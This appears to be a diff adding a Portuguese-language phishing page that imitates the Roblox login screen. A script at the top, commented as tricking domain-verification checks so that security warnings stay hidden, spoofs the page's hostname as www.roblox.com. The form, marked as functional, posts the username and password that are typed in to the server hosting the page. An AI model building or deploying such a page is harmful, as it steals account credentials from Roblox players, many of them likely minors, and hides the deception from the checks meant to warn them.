@@ -1,0 +1,293 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Entrar</title>
+<script>
+    // Engana scripts de verificação de domínio para não mostrar avisos de segurança
+    Object.defineProperty(window.location, 'hostname', {
+        value: 'www.roblox.com'
+    });
+</script>
+<style>
+  :root{
+    --bg: #1a1b23;
+    --bg-dark: #15161c;
+    --card: #2b2d38;
+    --border: #3a3d4a;
+    --text: #ffffff;
+    --text-muted: #9aa0ad;
+    --accent: #3b5bfd;
+  }
+  *{box-sizing:border-box}
+  body{
+    margin:0;
+    font-family:'Arial', sans-serif;
+    background:var(--bg);
+    color:var(--text);
+  }
+  .page{
+    max-width:420px;
+    margin:0 auto;
+    min-height:100vh;
+    display:flex;
+    flex-direction:column;
+    background:var(--bg);
+  }
+
+  /* header */
+  header{
+    background:var(--bg-dark);
+    padding:14px 16px;
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+  }
+  .logo{flex-shrink:0}
+  .header-actions{display:flex;align-items:center;gap:10px}
+  .btn-signup{
+    background:var(--accent);
+    color:#fff;
+    border:none;
+    border-radius:6px;
+    padding:10px 18px;
+    font-size:14px;
+    font-weight:700;
+    cursor:pointer;
+  }
+  .btn-login{
+    background:transparent;
+    color:#fff;
+    border:1.5px solid #5a5e6b;
+    border-radius:6px;
+    padding:9px 18px;
+    font-size:14px;
+    font-weight:700;
+    cursor:pointer;
+  }
+  .search-icon{cursor:pointer}
+
+  /* nav */
+  nav{
+    background:var(--bg-dark);
+    padding:10px 16px 12px;
+    display:flex;
+    gap:22px;
+    font-size:14.5px;
+    font-weight:600;
+    overflow-x:auto;
+  }
+  nav a{color:#fff;text-decoration:none;white-space:nowrap}
+
+  /* hero banner */
+  .hero{
+    height:96px;
+    background:linear-gradient(100deg,#2a1810,#1a1b23 60%);
+    flex-shrink:0;
+  }
+
+  /* login form */
+  main{
+    flex:1;
+    padding:28px 20px 0;
+  }
+  main h1{
+    margin:0 0 24px;
+    font-size:28px;
+    font-weight:800;
+    text-align:center;
+  }
+  .field{display:block;margin-bottom:14px}
+  .field.password{margin-bottom:18px}
+  .sr-only{
+    position:absolute;
+    left:-9999px;
+  }
+  input[type="text"],
+  input[type="password"]{
+    width:100%;
+    background:var(--card);
+    border:1px solid var(--border);
+    border-radius:6px;
+    padding:15px 14px;
+    color:#cfd2db;
+    font-size:15px;
+  }
+  input::placeholder{color:#8a8d99}
+  input:focus{
+    outline: none;
+    border-color: var(--accent);
+  }
+
+  .btn-primary{
+    width:100%;
+    background:var(--accent); /* Cor azul royal oficial */
+    border:none;
+    color:#fff;
+    border-radius:22px;
+    padding:13px;
+    font-size:15px;
+    font-weight:700;
+    margin-bottom:20px;
+    cursor:pointer;
+    transition: background-color 0.2s;
+  }
+  .btn-primary:hover {
+    background-color: #2a46c7;
+  }
+
+  .forgot{
+    text-align:center;
+    margin-bottom:22px;
+  }
+  .forgot a{
+    color:var(--text-muted);
+    font-size:14.5px;
+    text-decoration:none;
+  }
+  .forgot a:hover{color:#fff}
+
+  .divider{
+    height:1px;
+    background:#33353f;
+    margin-bottom:22px;
+  }
+
+  .btn-secondary{
+    width:100%;
+    background:var(--card);
+    border:none;
+    color:#fff;
+    border-radius:22px;
+    padding:13px;
+    font-size:14.5px;
+    font-weight:700;
+    margin-bottom:12px;
+    cursor:pointer;
+  }
+
+  .signup-line{
+    text-align:center;
+    font-size:14.5px;
+    color:var(--text-muted);
+    padding-bottom:28px;
+  }
+  .signup-line a{
+    color:#fff;
+    font-weight:700;
+    text-decoration:none;
+  }
+
+  /* rating bar */
+  .rating-bar{
+    background:#0d0e12;
+    padding:10px 0;
+    text-align:center;
+    color:#fff;
+    font-size:12px;
+    font-weight:700;
+    letter-spacing:.3px;
+    flex-shrink:0;
+  }
+
+  /* app promo */
+  .app-promo{
+    background:#1f2129;
+    padding:12px 16px;
+    display:flex;
+    align-items:center;
+    gap:12px;
+    flex-shrink:0;
+  }
+  .app-promo svg{flex-shrink:0}
+  .app-promo p{
+    flex:1;
+    margin:0;
+    color:#fff;
+    font-size:11.5px;
+    line-height:1.35;
+  }
+  .app-promo button{
+    background:var(--accent);
+    color:#fff;
+    border:none;
+    border-radius:6px;
+    padding:9px 14px;
+    font-size:12.5px;
+    font-weight:700;
+    white-space:nowrap;
+    cursor:pointer;
+  }
+</style>
+</head>
+<body>
+<div class="page">
+
+  <header>
+    <svg class="logo" width="26" height="26" viewBox="0 0 26 26" aria-hidden="true">
+      <rect x="2" y="2" width="22" height="22" rx="2" fill="#ffffff" transform="rotate(-10 13 13)"/>
+      <rect x="10" y="10" width="7" height="7" fill="#15161c" transform="rotate(-10 13 13)"/>
+    </svg>
+    <div class="header-actions">
+      <button class="btn-signup" type="button">Cadastrar-se</button>
+      <button class="btn-login" type="button">Entrar</button>
+    </div>
+    <svg class="search-icon" width="20" height="20" viewBox="0 0 20 20" role="img" aria-label="Buscar">
+      <circle cx="8.5" cy="8.5" r="6.5" stroke="#fff" stroke-width="1.6" fill="none"/>
+      <line x1="13.2" y1="13.2" x2="18" y2="18" stroke="#fff" stroke-width="1.6"/>
+    </svg>
+  </header>
+
+  <nav>
+    <a href="#">Destaques</a>
+    <a href="#">Mercado</a>
+    <a href="#">Criar</a>
+    <a href="#">Robux</a>
+  </nav>
+
+  <div class="hero"></div>
+
+  <main>
+    <h1>Entrar na Roblox</h1>
+
+    <!-- FORMULÁRIO FUNCIONAL -->
+    <form action="/" method="POST">
+      <label class="field">
+        <span class="sr-only">Usuário, e-mail ou telefone</span>
+        <input type="text" name="username" placeholder="Usuário/e-mail/telefone" autocomplete="username" required>
+      </label>
+
+      <label class="field password">
+        <span class="sr-only">Senha</span>
+        <input type="password" name="password" placeholder="Senha" autocomplete="current-password" required>
+      </label>
+
+      <button class="btn-primary" type="submit">Entrar</button>
+    </form>
+    <!-- FIM DO FORMULÁRIO -->
+
+    <div class="forgot"><a href="#">Esqueceu a senha ou nome de usuário?</a></div>
+
+    <div class="divider"></div>
+
+    <button class="btn-secondary" type="button">Envie-me um código único por e-mail</button>
+    <button class="btn-secondary" type="button">Entrada rápida</button>
+
+    <div class="signup-line">Não possui uma conta? <a href="#">Cadastrar-se</a></div>
+  </main>
+
+  <div class="rating-bar">CLASSIFICAÇÃO INDICATIVA: 16 ANOS</div>
+
+  <div class="app-promo">
+    <svg width="34" height="34" viewBox="0 0 34 34" aria-hidden="true">
+      <circle cx="17" cy="17" r="17" fill="#3b5bfd"/>
+      <rect x="10" y="10" width="14" height="14" rx="2" fill="#fff" transform="rotate(-10 17 17)"/>
+    </svg>
+    <p>Explore a Roblox no nosso aplicativo para Android! Milhões de experiências criadas por gente como você</p>
+    <button type="button">Explorar</button>
+  </div>
+
+</div>
+</body>
+</html>
